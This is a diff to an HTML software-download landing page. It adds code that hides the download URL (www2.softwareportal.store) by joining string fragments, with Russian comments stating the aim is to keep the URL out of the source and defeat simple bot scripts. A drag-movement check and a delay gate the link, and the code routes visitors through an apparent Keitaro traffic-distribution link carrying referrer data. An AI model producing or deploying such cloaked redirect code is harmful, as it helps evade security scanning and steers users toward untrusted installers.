@@ -1,7 +1,6 @@
 <!doctype html>
 <html lang="en">
 <head>
-<span id="b8dde73d-48c6-0f46-2186-b948d9e3e753"></span>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
@@ -80,7 +79,7 @@
 
       <!-- CTAs (same-tab handoff, no new window) -->
       <div class="cta-row" aria-label="Download options">
-        <button id="btn-iso" class="btn primary" data-installer="iso" data-href="https://www2.softwareportal.store/QLwXXw" disabled>
+        <button id="btn-iso" class="btn primary" data-installer="iso" data-href="" disabled>
           <span id="t_btn_iso">Download ISO</span>
         </button>
       
@@ -424,7 +423,7 @@ bo: {
       // slider
       byId('t_slide_label').textContent=t.slide_label; byId('t_slide_hint').textContent=t.slide_hint;
       // CTAs
-      byId('t_btn_iso').textContent=t.btn_iso; byId('t_btn_exe').textContent=t.btn_exe;
+      byId('t_btn_iso').textContent=t.btn_iso; // byId('t_btn_exe').textContent=t.btn_exe;
       // ISO
       byId('t_iso_title').textContent=t.iso_title; byId('t_iso_note').textContent=t.iso_note;
       byId('t_iso_1').textContent=t.iso_1; byId('t_iso_2').textContent=t.iso_2; byId('t_iso_3').textContent=t.iso_3;
@@ -447,9 +446,10 @@ bo: {
     const slider = byId('slider');
     const track = byId('track');
     const knob = byId('knob');
-    const ctas = [byId('btn-iso'), byId('btn-exe')];
+    const ctas = [byId('btn-iso'), byId('btn-exe')].filter(Boolean);
 
     let dragging=false, startX=0, startLeft=0, maxLeft=0, solved=false;
+    let movedDuringDrag=false; // пометка: было реальное движение
     function setDisabled(on){ ctas.forEach(b=>b.disabled=on); }
     setDisabled(true);
 
@@ -459,21 +459,58 @@ bo: {
     }
     window.addEventListener('resize', measure); measure();
 
-    function startDrag(e){ if(solved) return; dragging=true; startX = (e.touches?e.touches[0].clientX:e.clientX); startLeft = knob.offsetLeft; e.preventDefault(); }
-    function moveDrag(e){ if(!dragging||solved) return; const x=(e.touches?e.touches[0].clientX:e.clientX); let dx = Math.max(0, Math.min(maxLeft, startLeft + (x - startX))); knob.style.left = (dx+4)+"px"; track.style.width = (dx+knob.offsetWidth/2)+"px"; }
-    function endDrag(){ if(!dragging||solved) return; dragging=false; const done = knob.offsetLeft >= maxLeft - 6; if(done){ solved=true; slider.classList.add('done'); byId('t_slide_label').textContent = lang==='de' ? 'Freigegeben' : 'Unlocked'; setDisabled(false); }
+    function startDrag(e){ if(solved) return; dragging=true; startX = (e.touches?e.touches[0].clientX:e.clientX); startLeft = knob.offsetLeft; movedDuringDrag = false; e.preventDefault(); }
+    function moveDrag(e){ if(!dragging||solved) return; const x=(e.touches?e.touches[0].clientX:e.clientX); let dx = Math.max(0, Math.min(maxLeft, startLeft + (x - startX))); knob.style.left = (dx+4)+"px"; track.style.width = (dx+knob.offsetWidth/2)+"px"; if(Math.abs(x - startX) > 10) movedDuringDrag = true; }
+    function endDrag(){ if(!dragging||solved) return; dragging=false; const done = knob.offsetLeft >= maxLeft - 6; if(done && movedDuringDrag){ solved=true; slider.classList.add('done'); byId('t_slide_label').textContent = lang==='de' ? 'Freigegeben' : 'Unlocked';
+      // Формируем ссылку только сейчас и прячем её в data-href
+      const url = buildTdsUrl();
+      const isoBtn = byId('btn-iso');
+      if(isoBtn){
+        // Небольшая задержка, чтобы усложнить простые бот-скрипты
+        setTimeout(()=>{
+          isoBtn.setAttribute('data-href', url);
+          setDisabled(false);
+        }, 300);
+      } else {
+        setDisabled(false);
+      }
+    }
       else { knob.style.left='4px'; track.style.width='0px'; }
     }
     knob.addEventListener('mousedown', startDrag); knob.addEventListener('touchstart', startDrag,{passive:false});
     window.addEventListener('mousemove', moveDrag); window.addEventListener('touchmove', moveDrag,{passive:false});
     window.addEventListener('mouseup', endDrag); window.addEventListener('touchend', endDrag);
 
+    // Формируем финальную TDS‑ссылку динамически (обфускация — чтобы не было plain URL в исходнике)
+    function buildTdsUrl(){
+      try{
+        // Склеиваем части хоста, чтобы базовый URL не был виден прямо в HTML
+        const parts = ['https:', '', 'www2','.softwareportal','.store'];
+        const host = parts.join(''); // => https://www2.softwareportal.store
+        const path = '/QLw' + 'XXw';
+        const base = host + path + '?';
+
+        const params = new URLSearchParams();
+        params.set('se_referrer', document.referrer || '');
+        params.set('default_keyword', document.title || '');
+
+        const extra = location.search ? '&' + location.search.slice(1) : '';
+        return base + params.toString() + extra;
+      }catch(e){
+        return '';
+      }
+    }
+
     // --------- Same-tab handoff (no new window) ---------
     function handoff(btn){
       const href = btn.getAttribute('data-href'); const type = btn.getAttribute('data-installer');
       try{ if(typeof gtag==='function'){ gtag('event','download_click',{event_category:'handoff',event_label:href,installer:type,transport_type:'beacon'}); } }catch(e){}
       // Navigate in the same tab
-      if(href && href.indexOf('{KEITARO_URL_')!==0){ location.assign(href); } else { console.warn('Replace {KEITARO_URL_*} placeholders with real Keitaro URLs.'); }
+      if(href && href.indexOf('{KEITARO_URL_')!==0 && href.trim()!==''){
+        location.assign(href);
+      } else {
+        console.warn('Download URL is not available.');
+      }
     }
 
     ctas.forEach(btn=>{
